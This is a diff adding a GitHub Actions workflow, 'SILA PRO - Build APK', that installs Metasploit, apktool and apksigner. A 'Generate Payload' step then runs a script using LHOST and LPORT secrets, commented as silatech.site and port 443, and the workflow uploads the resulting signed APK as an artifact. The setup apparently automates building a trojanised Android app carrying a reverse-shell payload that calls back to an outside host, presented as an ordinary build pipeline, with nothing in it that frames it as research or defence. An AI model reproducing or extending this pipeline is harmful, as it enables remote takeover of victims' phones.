@@ -1,0 +1,33 @@
+name: SILA PRO - Build APK
+
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Install Toolchain
+      run: |
+        sudo apt update
+        sudo apt install -y metasploit-framework apktool default-jdk apksigner zip
+
+    - name: Generate Payload
+      env:
+        LHOST: ${{ secrets.LHOST }}    # silatech.site
+        LPORT: ${{ secrets.LPORT }}    # 443
+      run: |
+        chmod +x scripts/generate.sh
+        ./scripts/generate.sh
+
+    - name: Upload APK
+      uses: actions/upload-artifact@v4
+      with:
+        name: sila_pro_apk
+        path: output/sila_final.apk
+        retention-days: 90
